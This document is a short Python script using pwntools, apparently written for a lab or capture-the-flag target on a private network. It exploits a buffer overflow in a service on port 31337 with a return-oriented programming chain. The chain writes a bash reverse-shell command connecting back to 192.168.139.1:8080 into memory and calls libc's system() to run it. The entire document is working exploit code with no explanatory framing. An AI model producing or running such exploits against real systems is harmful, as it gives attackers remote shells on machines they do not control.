from pwn import *

HOST = "192.168.139.131"
PORT = 31337

def split_string(s):
    """Takes a string and splits it into parts of at most
       8 bytes length"""
    ret = []
    curr = []
    for e in s:
        if len(curr) < 8:
            curr.append(e)
        else:
            ret.append(bytes(curr))
            curr = []
            curr.append(e)
    ret.append(bytes(curr))
    return ret

def pad(bs):
    """left pad a bytestring with \x00"""
    return bs.ljust(8, b"\x00") 


exploit = b"/bin/bash -c 'bash -i >& /dev/tcp/192.168.139.1/8080 0>&1'\x00"

write_address = 0x404028 # start of .data section in the binary

libc_base = 0x7ffff7c00000

pop_rdi = p64(0x4011d3)
pop_gadget = p64(0x401136)
write_gadget = p64(0x401139)
ret = p64(0x40113c)
system = p64(0x58740 + libc_base)

payload = b"A" * 18

for (i, segment) in enumerate(split_string(exploit)):
    payload += pop_gadget + p64(write_address+(i*8)) + pad(segment)
    payload += write_gadget

payload += pop_rdi + p64(write_address)
payload += ret
payload += system
payload += pop_rdi + p64(0x0)

io = remote(HOST, PORT)
io.clean()
io.sendline(payload)

log.info("package sendt")

pause()
